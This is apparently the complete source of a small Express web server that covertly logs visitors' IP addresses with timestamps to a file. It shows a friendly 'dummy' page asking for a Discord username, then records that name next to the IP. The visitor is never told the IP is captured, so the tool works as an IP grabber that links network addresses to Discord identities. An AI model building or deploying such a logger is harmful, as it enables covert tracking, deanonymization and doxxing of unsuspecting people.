const express = require("express");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    // Log IP with placeholder for Discord username
    fs.appendFile("ips.txt", `${ip} - N/A - ${new Date().toLocaleString()}\n`, (err) => {
        if (err) console.log(err);
    });

    // Send polished dummy HTML page
    res.send(`
        <html>
        <head>
            <title>Hi!</title>
            <style>
                body {
                    font-family: 'Arial', sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #7289da, #99aab5);
                    margin: 0;
                }
                .container {
                    background: white;
                    padding: 40px;
                    border-radius: 12px;
                    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
                    text-align: center;
                    width: 350px;
                }
                h2 {
                    color: #2c2f33;
                }
                input {
                    width: 100%;
                    padding: 10px;
                    margin: 15px 0;
                    border-radius: 6px;
                    border: 1px solid #ccc;
                    font-size: 16px;
                }
                button {
                    background-color: #7289da;
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    font-size: 16px;
                    border-radius: 6px;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #5b6eae;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Hi! Please enter your Discord username!</h2>
                <form method="POST" action="/submit">
                    <input type="text" name="discord" placeholder="Discord username" />
                    <button type="submit">Submit</button>
                </form>
            </div>
        </body>
        </html>
    `);
});

// POST endpoint to capture Discord username
app.post("/submit", (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const discord = req.body.discord || "N/A";

    // Log IP and Discord username side by side
    fs.appendFile("ips.txt", `${ip} - ${discord} - ${new Date().toLocaleString()}\n`, (err) => {
        if (err) console.log(err);
    });

    res.send(`
        <html>
        <head>
            <title>Thanks!</title>
            <style>
                body {
                    font-family: 'Arial', sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #7289da, #99aab5);
                    margin: 0;
                    color: white;
                }
                .message {
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div class="message">
                <h2>Thanks! Your username has been received.</h2>
            </div>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}!`);
});
